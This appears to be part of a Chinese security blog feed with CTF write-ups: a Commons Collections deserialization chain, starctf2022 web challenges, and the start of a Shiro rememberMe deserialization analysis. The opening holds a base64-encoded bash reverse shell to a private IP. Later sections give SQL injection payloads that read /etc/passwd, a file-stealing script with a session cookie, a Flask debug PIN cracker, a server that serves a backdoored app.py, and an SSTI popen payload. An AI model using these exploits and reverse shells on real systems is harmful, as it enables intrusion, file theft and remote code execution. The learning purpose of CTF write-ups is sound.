&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">1896</span>);</span><br><span class="line">        objectOutputStream.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">        System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>细节：</p>
<p>最后<code>objectOutputStream.writeUTF</code>和<code>objectOutputStream.writeInt</code>要注意顺序，如果将<code>writeObject</code>放在前面会导致利用不成功。</p>
<p>序列化中遇到的常见问题：<a href="https://juejin.cn/post/6844903848167866375">https://juejin.cn/post/6844903848167866375</a></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220601224750-2gl6q46.png" alt="image.png"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>starctf2022</title>
    <url>/2022/04/19/starctf2022/</url>
    <content><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p>21支队伍ak了道web题也体现出这个比赛对web手的“友好”——不ak就达不到平均值。。</p>
<p>还是太菜了</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220417132137-fzotl1d.png" alt="image.png"></p>
<h1 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h1><p>登录之后在后台有注入，这里怎么都能注，能报错，能联合，能堆叠。唯一限制的地方可能是开了<code>secure_file_priv</code>不能用load_data</p>
<p>利用load data local infile 把文件数据读到自己建的表，并且可以绕过<code>secure_file_priv</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">建表whrssb：</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;create%2F%2A%2A%2Ftable%2F%2A%2A%2Fwhrssb%28data%2F%2A%2A%2Fvarchar%284294967295%29%29ENGINE%3DInnoDB%2F%2A%2A%2FDEFAULT%2F%2A%2A%2FCHARSET%3Dutf8%3B%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">读文件</span></span><br><span class="line"><span class="string">1&#x27;</span>;load%2F%2A%2A%2Fdata%2F%2A%2A%2Flocal%2F%2A%2A%2Finfile%2F%2A%2A%2F%<span class="number">22</span>%2Fetc%2Fpasswd%<span class="number">22</span>%2F%2A%2A%2Finto%2F%2A%2A%2Ftable%2F%2A%2A%2Fwhrssb%<span class="number">23</span></span><br><span class="line">load/**/data/**/local/**/infile/**/<span class="string">&quot;/etc/passwd&quot;</span>/**/into/**/table/**/whrssb<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span><span class="string">&#x27;/**/union/**/select/**/1,2,3,4,group%5Fconcat%28data%29%2F%2A%2A%2Ffrom%2F%2A%2A%2Fwhrssb%23  </span></span><br></pre></td></tr></table></figure>


<p>然后就能写脚本：</p>
<p>读取任意文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">basic_url = <span class="string">&quot;http://121.37.153.47:5002/&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;eyJjc3JmX3Rva2VuIjoiYzI1M2ZiNTQyMWRkY2ZjMGZmZDI5NGJlMDNkMDdjYzQwM2NhMzJjMiIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YlqUug.Sq9JqvfeVaFCF1mterkqzjBXTw8&quot;</span>&#125;</span><br><span class="line">url = basic_url + <span class="string">&quot;/view?note_id=&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_table</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    payload = <span class="string">&quot;1&#x27;;create%2F%2A%2A%2Ftable%2F%2A%2A%2Fwhrssb&quot;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&quot;%28data%2F%2A%2A%2Fvarchar%284294967295%29%29ENGINE%3DInnoDB%2F%2A%2A%2FDEFAULT%2F%2A%2A%2FCHARSET%3Dutf8%3B%23&quot;</span></span><br><span class="line">    r1 = requests.get(url+payload,cookies=cookies)</span><br><span class="line">    <span class="comment"># print(&quot;[+]create table whrssb&quot;+str(id))</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params"><span class="built_in">id</span>,filename</span>):</span><br><span class="line">    new_filename = filename.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;%2F&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;1&#x27;;load%2F%2A%2A%2Fdata%2F%2A%2A%2Flocal%2F%2A%2A%2Finfile%2F%2A%2A%2F%22&quot;</span>+new_filename+<span class="string">&quot;%22%2F%2A%2A%2Finto%2F%2A%2A%2Ftable%2F%2A%2A%2Fwhrssb&quot;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&quot;%23&quot;</span></span><br><span class="line">    requests.get(url+payload,cookies=cookies)</span><br><span class="line">    <span class="comment"># print(&quot;write in &quot;+new_filename+&quot; to whrssb&quot;+str(id))</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    payload = <span class="string">&quot;0&#x27;/**/union/**/select/**/1,2,3,4,group%5Fconcat%28data%29%2F%2A%2A%2Ffrom%2F%2A%2A%2Fwhrssb&quot;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&quot;%23&quot;</span></span><br><span class="line">    r1 = requests.get(url+payload,cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(r1.text)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tables</span>():</span><br><span class="line">    payload = <span class="string">&quot;0&#x27;/**/union/**/select/**/1,2,3,4,group%5Fconcat%28table%5Fname%29from%2F%2A%2A%2Finformation%5Fschema%2Etables%2F%2A%2A%2Fwhere%2F%2A%2A%2Ftable%5Fschema%3Ddatabase%28%29%23&quot;</span></span><br><span class="line">    r = requests.get(url+payload,cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">filename,<span class="built_in">id</span></span>):</span><br><span class="line">    create_table(<span class="built_in">id</span>)</span><br><span class="line">    write_file(<span class="built_in">id</span>,filename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==================&quot;</span>+filename+<span class="string">&quot;===============================================================&quot;</span>)</span><br><span class="line">    get_data(<span class="built_in">id</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;===============================================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># get_file(&quot;/etc/passwd&quot;,11)</span></span><br><span class="line">    get_file(<span class="string">&quot;/sys/class/net/eth0/address&quot;</span>,<span class="number">657</span>)</span><br><span class="line">    get_file(<span class="string">&quot;/etc/machine-id&quot;</span>,<span class="number">1567</span>)</span><br><span class="line"></span><br><span class="line">    get_file(<span class="string">&quot;/proc/self/cgroup&quot;</span>,<span class="number">266</span>)</span><br><span class="line">    <span class="comment"># get_file(&quot;/flag_cantguessit&quot;,232)</span></span><br><span class="line">    <span class="comment"># get_tables()</span></span><br><span class="line">    <span class="comment"># get_file(&quot;/etc/passwd&quot;,&quot;dfd&quot;)</span></span><br></pre></td></tr></table></figure>


<p>flask开了debug模式，算pin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> typing <span class="keyword">as</span> t</span><br><span class="line">username=<span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modname=<span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">mod=sys.modules.get(modname)</span><br><span class="line">mod = <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username, <span class="comment">#用户名</span></span><br><span class="line">    modname,  <span class="comment">#一般固定为flask.app</span></span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__name__), <span class="comment">#固定，一般为Flask</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>,   <span class="comment">#主程序（app.py）运行的绝对路径</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(probably_public_bits)</span><br><span class="line">mac =<span class="string">&#x27;02:42:c0:a8:00:03&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits = [</span><br><span class="line">   mac,<span class="comment">#mac地址十进制</span></span><br><span class="line"> <span class="string">&quot;1cc402dd0e11d5ae18db04a6de87223df94918dc15380836ea1b18193fe060888b28f6a7245d06858bf6ea3dc61fbeee&quot;</span><span class="comment">#/etc/machine-id+cgroup</span></span><br><span class="line">     ]</span><br><span class="line"><span class="built_in">print</span>(private_bits)</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>


<p>然后这里就是玄学了，可能蹭到别人的车了，一般debug之后执行不了命令，但是有时又可以了</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/V7LO8MI_5PABDPCL-20220417204534-6apl6dw.png" alt="V7LO8MI_5PABDPCL.png"></p>
<p>趁他可以的时候弹shell</p>
<p>（不抽风的时候，这里应该是蹭到其他一个环境里队伍的车了）：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/92JZRR4UCWIYTKCH8VBG-20220417204633-60k2osr.png" alt="92JZRR4UCWIYTKCH8VBG.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/PPQWVV4G1FUDPCGH-20220417204645-e9hr7n5.png" alt="PPQWVV4G1FUDPCGH.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">*ctf&#123;exploit_Update_with_Version&#125;$</span><br></pre></td></tr></table></figure>


<h1 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h1><p>这道题我做的方法，应该不是预期解（</p>
<p>老题目附件删掉了，了解了整个程序的逻辑就行。</p>
<p>整个获取flag的流程：</p>
<p>有一次修改环境变量的机会——&gt;从wget本地开的另一个服务获取到随机的lotto结果——&gt;和可控的预测结果匹配——&gt;相同返回flag</p>
<p>如果wget没有获取到新的flag，那lotto结果就会是上局的结果，是已知的，就能通过。</p>
<p>因此我通过修改环境变量PATH直接把wget拒之门外了，为了防止ban了其他的可能对正常流程影响的函数，就用通配符限制了一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">bin</span>/?:/usr/<span class="built_in">bin</span>/??:/usr/<span class="built_in">bin</span>/???:/usr/<span class="built_in">bin</span>/?????:/usr/<span class="built_in">bin</span>/?????*</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220417022313-7qizxta.png" alt="image.png"></p>
<h1 id="oh-my-lotto-revenge"><a href="#oh-my-lotto-revenge" class="headerlink" title="oh-my-lotto-revenge"></a>oh-my-lotto-revenge</h1><p>这道题比赛没做出来，属于赛后复现</p>
<p>当我们猜中的时候，不再返回flag，所以要考虑怎么通过修改环境变量<strong>rce</strong></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419201604-2cx3cnl.png" alt="image.png"></p>
<p>因此这道题涉及的知识点又是——环境变量注入</p>
<h2 id="解法1-挟持wget参数"><a href="#解法1-挟持wget参数" class="headerlink" title="解法1-挟持wget参数"></a>解法1-挟持wget参数</h2><p>貌似是非预期</p>
<p>看的y4tacker👴👴的wp学的，链接：<a href="https://y4tacker.github.io/2022/04/18/year/2022/4/2022-CTF-Web/#oh-my-lotto-revenge">https://y4tacker.github.io/2022/04/18/year/2022/4/2022-CTF-Web/#oh-my-lotto-revenge</a></p>
<p><code>wget --content-disposition -N lotto</code></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419205519-e7eoopj.png" alt="image.png"></p>
<p>当时自己做的时候也想通过修改代理让他请求别的地址，但是因为黑名单里ban了http所以没有成功</p>
<p>这里翻看<a href="https://www.gnu.org/software/wget/manual/wget.html#Proxies">wget的手册</a>，找到了可以利用的环境变量<code>WGETRC</code></p>
<p>试验一下发现可以挟持参数，比如http_proxy，也就是上面我们想干的事情</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419210821-znf69a1.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419210907-y8lmxgi.png" alt="image.png"></p>
<p>这里结合输出参数，覆盖原有的index.html打ssti即可</p>
<blockquote>
<p>output_document &#x3D; fileSet </p>
<p>the output filename—the same as ‘-O file’.</p>
</blockquote>
<p>写入WGETRC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">http_proxy=http:<span class="comment">//xxxxx</span></span><br><span class="line">output_document = templates/index.html</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">写入html内容：</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;反弹shell&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>


<p>能可控写入就行</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419221514-z08ioyl.png" alt="image.png"></p>
<h2 id="解法2-HOSTALIASES"><a href="#解法2-HOSTALIASES" class="headerlink" title="解法2-HOSTALIASES"></a>解法2-HOSTALIASES</h2><p><a href="https://github.com/sixstars/starctf2022/blob/main/web-oh-my-lotto%20%26%20revenge/web-oh-my-lotto%26revenge-ZH.md">https://github.com/sixstars/starctf2022/blob/main/web-oh-my-lotto%20%26%20revenge/web-oh-my-lotto%26revenge-ZH.md</a></p>
<p>通过阅读<a href="http://www.scratchbox.org/documentation/general/tutorials/glibcenv.html">linux文档</a>，发现在Network Settings中有可以利用的地方</p>
<p>在Network Settings中发现有<code>HOSTALIASES</code>可以设置shell的hosts加载文件，利用<code>/forecast</code>路由可以上传待加载的hosts文件，将<code>wget --content-disposition -N lotto</code>发向lotto的请求转发到自己的域名例如如下hosts文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># hosts</span><br><span class="line">lotto mydomain.com</span><br></pre></td></tr></table></figure>

<p>这样就可以请求到我们自己的vps上面</p>
<p><code>--content-disposition</code>参数让wget下载比当前目录下新的文件，所以我们可以覆盖app.py</p>
<p>还是wp中给出的poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    r = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from flask import Flask,request</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app = Flask(__name__)</span></span><br><span class="line"><span class="string">@app.route(&quot;/test&quot;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="string">def test():</span></span><br><span class="line"><span class="string">    a = request.args.get(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">    a = os.popen(a)</span></span><br><span class="line"><span class="string">    a = a.read()</span></span><br><span class="line"><span class="string">    return str(a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="string">    app.run(debug=True,host=&#x27;0.0.0.0&#x27;, port=8080)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    response = make_response(r)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=app.py&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>


<p>此时虽然app.py已经被覆盖，但是没有被部署</p>
<p>题目用的是<code>gunicorn.conf.py</code>来部署的，我们让他超时就能够重写加载我们覆盖掉的app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span> &amp;</span><br><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span> &amp;</span><br><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span></span><br></pre></td></tr></table></figure>


<p>然后就能rce了，感觉这道题的关键还是在环境变量那里，当时做题的时候想到去修改代理，但是http等关键词被ban了就不会了，还得是去翻可用的环境变量，找到能够修改shell的代理的HOSTALIASES，从而才能覆盖app.py</p>
<p>关于linux，还是有好多可以学习的地方啊！</p>
]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>初始shiro反序列化漏洞</title>
    <url>/2022/04/06/shiro-1-cc/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本篇分为上下两部分</p>
<ul>
<li>介绍shiro,调试分析shiro出现反序列化漏洞的根本原因</li>
<li>通过自己修改CC链来攻击shiro应用</li>
</ul>
<blockquote>
<p>关于shiro的基本学习，概念，就不发博客了</p>
</blockquote>
<h1 id="简单的shiro应用搭建"><a href="#简单的shiro应用搭建" class="headerlink" title="简单的shiro应用搭建"></a>简单的shiro应用搭建</h1><p>p牛写的一个最简单的shiro登录应用，没有适用任何框架，十分简单。</p>
<p><a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p>
<p>我们配置一下自己的maven，配置一下tomcat发布就行。</p>
<p>用root&#x2F;secret登录，返回一个remeberMe就说明搭建ok了</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405200324-qnipuyf.png" alt="image.png"></p>
<h1 id="shiro反序列化漏洞原理剖析"><a href="#shiro反序列化漏洞原理剖析" class="headerlink" title="shiro反序列化漏洞原理剖析"></a>shiro反序列化漏洞原理剖析</h1><p>从简介中我们得知，是Cookie中的remberMe字段出的问题，shiro会将它解密之后反序列化。</p>
<p>所以要针对remberMe来进行分析</p>
<h2 id="生成remberMe"><a href="#生成remberMe" class="headerlink" title="生成remberMe"></a>生成remberMe</h2><p>shiro生成remberMe的地方在<code>org.apache.shiro.mgt.DefaultSecutiryManager</code>的login方法，可以打上断点调试。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405225302-71rolmh.png" alt="image.png"></p>
<p>截获断点，当登陆成功的时候，会进入下面的<code>createSubject</code>，创建一个新的Subject</p>
<blockquote>
<p>Subject: 为<code>认证主体</code>。应用代码直接交互的对象是Subject,Subject代表了当前的用户。包含<code>Principals</code>和<code>Credentials</code>两个信息。</p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405230135-k2h55d5.png" alt="image.png"></p>
<p>步入下面的onSuccessfulLogin()方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405230700-ilvuwi4.png" alt="image.png"></p>
<p>这里的token为我们浏览器传入的数据，其中remberMe为true，代表开启remberMe</p>
<p>subject是传进来的loggin</p>
<p>步入rmm.onSuccessfulLogin方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405230944-hofzlf3.png" alt="image.png"></p>
<p>继续跟进，最终发现序列化accountPrincipals对象的地方在这里：</p>
<p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code> 的convertPrincipalsToBytes方法中</p>
<p>下面也能看到完整方法栈，如果想调试可以参考。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405231222-d49u3to.png" alt="image.png"></p>
<p>然后在这里base64编码然后设置为cookie</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405231629-6wc4wmc.png" alt="image.png"></p>
<h2 id="解析remberMe"><a href="#解析remberMe" class="headerlink" title="解析remberMe"></a>解析remberMe</h2><p>用刚刚生成的正常的remberMe来调试反序列化，直接锁定<code>AbstractRememberMeManager</code>这个类在解密的地方打上断点，（不知道前面的过程但是肯定要解密反序列化吧）</p>
<p>发包的时候要删除原来的JSSESSID，建立一个新会话</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405233813-vkelq2w.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405233904-io898k8.png" alt="image.png"></p>
<p>哦吼，截获了断点，获得了方法栈，往上面追溯到<code>DefaultSecutiryManager</code>进行调试</p>
<p>跟进getRemberedIdentity方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405234603-s7io7wr.png" alt="image.png"></p>
<p>此时我们的remberMe在这个里面，可以自行展开看，截图不够了<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405234858-u1tfgzy.png" alt="image.png"></p>
<p>跟进getRememberedIdentity方法：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235039-pxih2yy.png" alt="image.png"></p>
<p>这里应该是要反序列化获得Principals对象了</p>
<p>跟进方法，发现这里先通过一个方法来获得字节数组，然后再反序列化</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235134-8e2icfj.png" alt="image.png"></p>
<p>先看getRemberedSerializedIdentity方法</p>
<p>这个方法中base64解码了我们传入的remberMe字段，转化为字节数组然后返回</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235336-ym3alnt.png" alt="image.png"></p>
<p>convertBytesToPrincipals方法先进行解密，然后反序列化</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220405235525-7gdo2js.png" alt="image.png"><br /></p>
<p>（中间跳过了几个步骤）在这里readObject</p>
